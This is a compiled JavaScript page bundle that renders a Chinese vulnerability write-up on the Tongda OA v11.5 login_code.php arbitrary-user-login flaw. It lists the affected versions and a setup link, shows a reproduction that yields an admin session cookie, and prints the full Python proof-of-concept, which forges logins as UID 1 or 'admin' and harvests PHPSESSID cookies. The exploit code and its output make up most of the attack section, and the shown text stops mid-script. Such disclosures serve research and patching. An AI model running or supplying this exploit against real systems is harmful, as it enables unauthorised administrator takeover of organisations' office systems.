(window.webpackJsonp=window.webpackJsonp||[]).push([[297],{1520:function(s,t,a){s.exports=a.p+"assets/img/tongdaoa-1.bc209e2b.png"},1521:function(s,t,a){s.exports=a.p+"assets/img/tongdaoa-2.8b8eff9a.png"},2439:function(s,t,a){"use strict";a.r(t);var n=a(75),r=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"通达oa-v11-5-login-code-php-任意用户登录"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-5-login-code-php-任意用户登录"}},[s._v("#")]),s._v(" 通达OA v11.5 login_code.php 任意用户登录")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。\n该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。")]),s._v(" "),n("h2",{attrs:{id:"影响版本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("通达OA 2017版")]),n("br"),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("通达OA版本  V11.X < V11.5")]),n("br"),s._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),n("p",[s._v("漏洞环境下载")]),s._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[s._v("https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("双击安装即可")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1520),alt:"img"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("使用"),n("a",{attrs:{href:"https://github.com/NS-Sp4ce/TongDaOA-Fake-User/blob/master/POC.py",target:"_blank",rel:"noopener noreferrer"}},[s._v("POC"),n("OutboundLink")],1),s._v("获取管理员的Cookie")]),s._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[s._v("root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx\n[+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("成功获得Cookie,添加Cookie访问")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("/general/index.php?isIE=0&modify_pwd=0\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1521),alt:"img"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[s._v("#")]),s._v(" 漏洞POC")]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[s._v("'''\n@Author         : Sp4ce\n@Date           : 2020-03-17 23:42:16\nLastEditors    : Sp4ce\nLastEditTime   : 2020-08-27 10:21:44\n@Description    : Challenge Everything.\n'''")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" random "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" choice\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" argparse\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" json\n\nUSER_AGENTS "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nheaders"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("getV11Session")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    checkUrl "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" url"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/general/login_code.php'")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("try")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"User-Agent"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" choice"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("USER_AGENTS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        res "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("checkUrl"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        resText "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("res"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("split"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'{'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        codeUid "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" resText"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("replace"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'}\"}'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("replace"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\r\\n'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        getSessUrl "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" url"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/logincheck_code.php'")]),s._v("\n        res "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n            getSessUrl"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" data"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'CODEUID'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'{'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("codeUid"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'}'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'UID'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("int")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        tmp_cookie "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" res"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Set-Cookie'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n        headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"User-Agent"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" choice"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("USER_AGENTS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Cookie"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" tmp_cookie\n        check_available "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/general/index.php'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'用户未登录'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" check_available"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'重新登录'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" check_available"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n                "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[+]Get Available COOKIE:'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" tmp_cookie"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[-]Something Wrong With '")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" url "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("',Maybe Not Vulnerable.'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("except")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[-]Something Wrong With '")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("get2017Session")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    checkUrl "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" url"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/ispirit/login_code.php'")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("try")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"User-Agent"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" choice"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("USER_AGENTS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        res "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("checkUrl"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        resText "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("loads"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("res"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        codeUid "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" resText"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'codeuid'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n        codeScanUrl "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" url"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/general/login_code_scan.php'")]),s._v("\n        res "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("codeScanUrl"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" data"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'codeuid'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" codeUid"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'uid'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("int")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'source'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'pc'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'type'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'confirm'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'username'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'admin'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        resText "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("loads"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("res"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        status "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" resText"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'status'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" status "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            getCodeUidUrl "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" url"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/ispirit/login_code_check.php?codeuid='")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("codeUid\n            res "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("getCodeUidUrl"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            tmp_cookie "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" res"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Set-Cookie'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n            headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"User-Agent"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" choice"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("USER_AGENTS"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Cookie"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" tmp_cookie\n            check_available "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/general/index.php'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'用户未登录'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" check_available"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n                "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'重新登录'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("not")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" check_available"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n                    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[+]Get Available COOKIE:'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" tmp_cookie"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n                "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[-]Something Wrong With '")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" url "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("',Maybe Not Vulnerable.'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[-]Something Wrong With '")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("url  "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("' Maybe Not Vulnerable ?'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("except")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'[-]Something Wrong With '")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" __name__ 